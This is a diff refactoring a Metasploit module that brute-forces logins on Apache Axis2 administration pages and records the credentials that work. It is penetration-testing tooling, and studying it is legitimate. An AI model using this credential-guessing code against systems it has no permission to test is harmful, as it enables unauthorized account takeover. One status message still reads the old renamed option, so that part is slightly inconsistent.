@@ -1,11 +1,12 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 
 require 'msf/core'
 require 'metasploit/framework/login_scanner/axis2'
+require 'metasploit/framework/credential_collection'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -39,24 +40,27 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options( [
       Opt::RPORT(8080),
-      OptString.new('URI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
+      OptString.new('TARGETURI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
     ], self.class)
   end
 
+  # For print_* methods
   def target_url
     "http://#{vhost}:#{rport}#{datastore['URI']}"
   end
 
   def run_host(ip)
+    uri = normalize_uri(target_uri.path)
 
     print_status("Verifying login exists at #{target_url}")
     begin
       send_request_cgi({
         'method'  => 'GET',
-        'uri'     => datastore['URI']
+        'uri'     => uri
       }, 20)
-    rescue
-      print_error("The Axis2 login page does not exist at #{target_url}")
+    rescue => e
+      print_error("Failed to retrieve Axis2 login page at #{target_url}")
+      print_error("Error: #{e.class}: #{e}")
       return
     end
 
@@ -72,78 +76,50 @@ class Metasploit3 < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS'],
     )
 
+    cred_collection = prepend_db_passwords(cred_collection)
+
     scanner = Metasploit::Framework::LoginScanner::Axis2.new(
       host: ip,
       port: rport,
-      uri: datastore['URI'],
-      proxies: datastore["PROXIES"],
+      uri: uri,
+      proxies: proxies,
       cred_details: cred_collection,
       stop_on_success: datastore['STOP_ON_SUCCESS'],
+      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
       connection_timeout: 5,
+      user_agent: datastore['UserAgent'],
+      vhost: datastore['VHOST']
     )
 
     scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+          module_fullname: self.fullname,
+          workspace_id: myworkspace_id
+      )
       case result.status
       when Metasploit::Model::Login::Status::SUCCESSFUL
         print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
-        do_report(ip, rport, result)
+        credential_core = create_credential(credential_data)
+        credential_data[:core] = credential_core
+        create_credential_login(credential_data)
         :next_user
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-        print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
-        invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
-        )
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+        end
+        invalidate_login(credential_data)
         :abort
       when Metasploit::Model::Login::Status::INCORRECT
-        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
-        invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
-        )
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+        end
+        invalidate_login(credential_data)
       end
     end
 
   end
 
-  def do_report(ip, port, result)
-    service_data = {
-      address: ip,
-      port: port,
-      service_name: 'http',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
 
-    credential_data = {
-      module_fullname: self.fullname,
-      origin_type: :service,
-      private_data: result.credential.private,
-      private_type: :password,
-      username: result.credential.public,
-    }.merge(service_data)
-
-    credential_core = create_credential(credential_data)
-
-    login_data = {
-      core: credential_core,
-      last_attempted_at: DateTime.now,
-      status: result.status
-    }.merge(service_data)
-
-    create_credential_login(login_data)
-  end
 
 end
